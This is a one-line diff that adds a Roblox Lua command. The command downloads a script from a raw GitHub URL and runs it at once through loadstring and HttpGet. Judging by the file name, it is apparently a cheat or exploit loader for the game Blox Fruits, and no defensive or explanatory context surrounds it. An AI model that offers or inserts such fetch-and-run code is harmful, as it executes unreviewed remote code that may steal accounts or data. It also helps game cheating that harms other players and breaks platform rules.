@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/blox-fruits-spam6-5cq1sklml5oxai.lua"))()
